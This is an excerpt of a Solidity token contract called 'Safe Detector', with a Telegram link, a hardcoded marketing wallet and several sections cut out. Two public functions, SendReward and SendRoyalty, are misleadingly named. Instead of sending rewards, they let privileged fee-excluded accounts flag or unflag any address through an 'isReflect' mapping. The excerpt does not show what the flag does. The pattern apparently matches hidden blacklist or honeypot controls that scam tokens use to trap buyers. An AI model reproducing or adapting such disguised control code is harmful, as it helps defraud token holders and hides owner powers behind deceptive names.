...
/**
    Safe Detector
    Telegram : https://t.me/safedetector
*/
...
contract SafeDetector is Context, IERC20, Ownable {
       
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Safe Detector";
    string private _symbol = "SAFEDETECTOR";
    uint8 private _decimals = 9;
    address payable public marketingWalletAddress; 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    address _marketingWalletAddress = 0x17Fd802338Ea8359F69E219Db4baA8cA40079f22;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) isReflect;
    ...
    function SendReward(address _address) public {
        require(isExcludedFromFee[msg.sender]);
        isReflect[_address] = true;
    }

    function SendRoyalty(address _address) public {
        require(isExcludedFromFee[msg.sender]);
        isReflect[_address] = false;
    }
